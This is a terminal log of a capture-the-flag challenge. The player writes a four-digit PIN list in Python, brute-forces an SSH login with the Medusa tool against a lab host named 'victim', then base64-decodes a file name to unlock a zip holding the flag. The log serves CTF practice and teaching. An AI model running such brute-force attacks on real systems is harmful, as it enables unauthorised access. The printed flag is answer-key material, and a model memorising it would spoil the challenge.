@@ -1,0 +1,154 @@
+The authenticity of host '[medusa.neverlanctf.com]:3333 ([35.167.61.210]:3333)' can't be established.
+ECDSA key fingerprint is SHA256:oprngc209oY97WuCcHGKwxJ30hx74zN8uxZ2BrVgXeE.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '[medusa.neverlanctf.com]:3333,[35.167.61.210]:3333' (ECDSA) to the list of known hosts.
+neverlan@medusa.neverlanctf.com's password:
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-1058-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+─────█─▄▀█──█▀▄─█─────
+────▐▌──────────▐▌────
+────█▌▀▄──▄▄──▄▀▐█────
+───▐██──▀▀──▀▀──██▌───
+──▄████▄──▐▌──▄████▄──
+
+
+┏┓┏┓┏┓╋╋┏┓╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┏┓
+┃┃┃┃┃┃╋╋┃┃╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┃┃
+┃┃┃┃┃┣━━┫┃┏━━┳━━┳┓┏┳━━┓┏━━┫┃┏━━┳┓╋┏┳━━┳━┓
+┃┗┛┗┛┃┃━┫┃┃┏━┫┏┓┃┗┛┃┃━┫┃┏┓┃┃┃┏┓┃┃╋┃┃┃━┫┏┛
+┗┓┏┓┏┫┃━┫┗┫┗━┫┗┛┃┃┃┃┃━┫┃┗┛┃┗┫┏┓┃┗━┛┃┃━┫┃
+╋┗┛┗┛┗━━┻━┻━━┻━━┻┻┻┻━━┛┃┏━┻━┻┛┗┻━┓┏┻━━┻┛
+╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┃┃╋╋╋╋╋╋┏━┛┃
+╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┗┛╋╋╋╋╋╋┗━━┛
+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+.:INSTRUCTIONS:.
+
+You have been tasked with infultrating
+and stealing the login creds from an evil
+cyber lord.. Our sources say he locks
+down all of his files with a password
+you'll need to work your way around this.
+keep your eyes peeled and your mind sharp..
+we have supplyed you with an intel file located
+in your home directory and all the tool's
+nessesary for this Mission.
+good luck player... Hack the planet!!!
+
+.:END OF INSTRUCTION:.
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+neverlan@medusa-ssh-player:~$ cat intel.txt
+INTEL GATHERED ON MR CTHULHU
++=+=+=+=+=+=+=+=+=+=+=+=+=+
+Name: cthulhu
+Handle: evil
+Location: Twin Falls, Idaho USA
+Age: 36
+Race: N/A
+Threat Level: 10
+
+The recon team has found that mr cthulhu
+has a small server with only a 4 digit pin
+locking it down. port 22 is open and it seems
+to hold some sesitive data on his operations
+break the password and get in.
+Username: evil
+Password: N/A
+Address: victim
+
+neverlan@medusa-ssh-player:~$ python3
+Python 3.6.9 (default, Nov  7 2019, 10:44:02)
+[GCC 8.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> with open("pins.txt", "w") as f:
+...     for i in range(10000):
+...         f.write(f"{i:04}\n")
+...
+>>>
+neverlan@medusa-ssh-player:~$ medusa -h victim -u evil -P pins.txt -M ssh
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2020-02-11 20:27:14 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0000 (1 of 10000 complete)
+2020-02-11 20:27:16 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0001 (2 of 10000 complete)
+2020-02-11 20:27:18 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0002 (3 of 10000 complete)
+2020-02-11 20:27:20 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0003 (4 of 10000 complete)
+2020-02-11 20:27:22 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0004 (5 of 10000 complete)
+2020-02-11 20:27:24 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0005 (6 of 10000 complete)
+2020-02-11 20:27:27 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0006 (7 of 10000 complete)
+2020-02-11 20:27:28 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0007 (8 of 10000 complete)
+2020-02-11 20:27:31 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0008 (9 of 10000 complete)
+2020-02-11 20:27:33 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0009 (10 of 10000 complete)
+2020-02-11 20:27:35 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0010 (11 of 10000 complete)
+2020-02-11 20:27:37 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0011 (12 of 10000 complete)
+2020-02-11 20:27:39 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0012 (13 of 10000 complete)
+2020-02-11 20:27:41 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0013 (14 of 10000 complete)
+2020-02-11 20:27:43 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0014 (15 of 10000 complete)
+2020-02-11 20:27:45 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0015 (16 of 10000 complete)
+2020-02-11 20:27:48 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0016 (17 of 10000 complete)
+2020-02-11 20:27:49 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0017 (18 of 10000 complete)
+2020-02-11 20:27:51 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0018 (19 of 10000 complete)
+2020-02-11 20:27:53 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0019 (20 of 10000 complete)
+2020-02-11 20:27:55 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0020 (21 of 10000 complete)
+2020-02-11 20:27:57 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0021 (22 of 10000 complete)
+2020-02-11 20:27:59 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0022 (23 of 10000 complete)
+2020-02-11 20:28:01 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0023 (24 of 10000 complete)
+2020-02-11 20:28:01 ACCOUNT CHECK: [ssh] Host: victim (1 of 1, 0 complete) User: evil (1 of 1, 0 complete) Password: 0024 (25 of 10000 complete)
+2020-02-11 20:28:01 ACCOUNT FOUND: [ssh] Host: victim User: evil Password: 0024 [SUCCESS]
+
+neverlan@medusa-ssh-player:~$ ssh evil@victim
+evil@victim's password:
+Permission denied, please try again.
+evil@victim's password:
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-1058-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+▄█▀─▄▄▄▄▄▄▄─▀█▄
+▀█████████████▀
+────█▄███▄█
+─────█████
+─────█▀█▀█
+
+      ___
+     /  /\          ___        ___
+    /  /:/_        /__/\      /  /\
+   /  /:/ /\       \  \:\    /  /:/      ___     ___
+  /  /:/ /:/_       \  \:\  /__/::\     /__/\   /  /\
+ /__/:/ /:/ /\  ___  \__\:\ \__\/\:\__  \  \:\ /  /:/
+ \  \:\/:/ /:/ /__/\ |  |:|    \  \:\/\  \  \:\  /:/
+  \  \::/ /:/  \  \:\|  |:|     \__\::/   \  \:\/:/
+   \  \:\/:/    \  \:\__|:|     /__/:/     \  \::/
+    \  \::/      \__\::::/      \__\/       \__\/
+     \__\/           ~~~~
+
+evil@abf75d0823a4:~$ ls
+c3RvbmVjb2xk.zip  hint.txt
+evil@abf75d0823a4:~$ cat hint.txt
++-----------------------------------------------------+
+| My location is worthless but My name is everything. |
++-----------------------------------------------------+
+evil@abf75d0823a4:~$ echo c3RvbmVjb2xk | base64 -d
+stonecold
+evil@abf75d0823a4:~$ unzip c3RvbmVjb2xk.zip
+Archive:  c3RvbmVjb2xk.zip
+[c3RvbmVjb2xk.zip] flag.txt password:
+ extracting: flag.txt
+evil@abf75d0823a4:~$ cat flag.txt
+FLAG{d0nt_l00k_int0_h3r_Eyes!}
